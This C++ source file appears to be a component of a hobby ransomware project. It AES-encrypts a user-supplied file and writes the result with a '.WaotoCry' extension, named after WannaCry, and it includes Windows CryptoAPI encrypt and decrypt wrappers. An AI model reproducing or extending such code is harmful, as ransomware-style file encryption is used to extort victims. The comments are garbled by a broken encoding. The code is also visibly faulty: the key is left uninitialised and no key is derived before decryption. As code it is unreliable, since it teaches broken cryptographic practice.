#include "Un-main.h"
#include"resource/Encryption/aes_pre.h"
using namespace std;
const char* buff = ".WaotoCry";


/*
ȫ�ֱ�����
*/

//AES

int Encryption(char process_path) {
	int i;
	int cnt;//������ÿ16�ַ�һ��
	char PP;//��ȡ����(������)
	//char Key[32];//��Կ�ַ���--16����
	int K[4];//��Կword�����ƣ�32λ��
	char P[16];//����(������)16�ַ�һ����ܣ�ÿ��8bit.
	char  fin[256], fout[256];//��������ļ���
	//�ļ����������
	cin >> fin;//input path
	ifstream infile(fin, ios::in | ios::binary);
	if (!infile) {
		cin >> i;
		return 0;
	}
	strcat_s(fin, buff);  //Ĭ�ϱ�����ͬ�ļ��У���׺.aes
	ofstream outfile(fin, ios::out | ios::binary);
	if (!outfile) {
		infile.close();
		cin >> i;
		return 0;
	}
	infile.unsetf(ios::skipws); //����Ϊ�������ļ��еĿո�
	//��ʼ����
	cnt = 0;//��ʼֵ
	while (infile.get(PP)) {  //ÿ�ζ�ȡһ���ַ�
		P[cnt] = PP;//����ת��Ϊ ������
		cnt += 1;
		if (cnt == 16) {  //ÿ�˸�һ��
			cnt = 0; //clear
			aes(P, K);//����
			for (i = 0; i < 16; i++) {
				outfile.put(P[i]);  //ÿ��д��һ���ַ�
			}
		}
	}
	if (cnt != 0) {  //�ļ�����16�ַ��ı���
		for (i = cnt; i < 16; i++) {
			P[i] = 0;
		}
		cnt = 0;
		aes(P, K);//����
		for (i = 0; i < 16; i++) {
			outfile.put(P[i]);  //ÿ��д��һ���ַ�
		}
	}
	outfile.close();
	infile.close();
}
	

//? AES��������ģ��
int Aes_Encryption_Funtion(BYTE* ppassword, DWORD dwpasswordLength, BYTE* pData, DWORD& dwDatalength, DWORD dwBufferLength) {
	int bRet;
	HCRYPTPROV hcryptprov;
	HCRYPTPROV hCrypthash;
	HCRYPTPROV hCryptkey;
	do
	{
		//! ��ȡCSP���
		bRet = ::CryptAcquireContext(&hcryptprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
		if (FALSE == bRet)
		{
			break;
		}
		//!  ��ȡHASH���� 
		bRet = ::CryptCreateHash(hcryptprov, CALG_MD5, NULL, 0, &hCrypthash);
		if (false == bRet)
		{
			break;
		}
		//! ����Կ����HASH����
		bRet = ::CryptHashData(hCrypthash, ppassword, dwpasswordLength, 0);
		if (false == bRet)
		{
			break;
		}
		//! ʹ��HASH������Կ
		bRet = ::CryptDeriveKey(hcryptprov, CALG_AES_128, hCrypthash, CRYPT_EXPORTABLE, &hCryptkey);
		if (false == bRet)
		{
			break;
		}
		//!? ��������
		bRet = ::CryptEncrypt(hCryptkey, NULL, TRUE, 0, pData, &dwDatalength, dwBufferLength);
		if (FALSE == bRet)
		{
			return 0;
		}

	} while (FALSE);
	return bRet;
}



//? AES����ģ��
int AES_decrypt_Funtion(BYTE* pPassword, DWORD dwPasswordlength, BYTE* pData, DWORD& dwDataLength, DWORD dwbufferLength) {
	//! ������
	int bRet;
	HCRYPTPROV hCryptProv;
	HCRYPTPROV hCrypthash;
	HCRYPTPROV hCryptKey;
	do
	{
		//! ��ȡCSP���
		bRet = ::CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
		if (FALSE == bRet)
		{
			break;
		}
		//�� ����HASH����
		bRet = ::CryptCreateHash(hCryptProv, CALG_MD5, NULL, 0, &hCrypthash);
		if (FALSE == bRet)
		{
			break;
		}
		//!  ��ʼ���ɼ�����Կ
		bRet = ::CryptHashData(hCrypthash, pPassword, dwPasswordlength, 0);
		if (FALSE == bRet)
		{
			break;
		}
		//!? ��ʼ��������
		bRet = ::CryptDecrypt(hCryptKey, NULL, TRUE, 0, pData, &dwDataLength);
		if (FALSE == bRet)
		{
			break;
		}
	} while (false);
	return bRet;
}

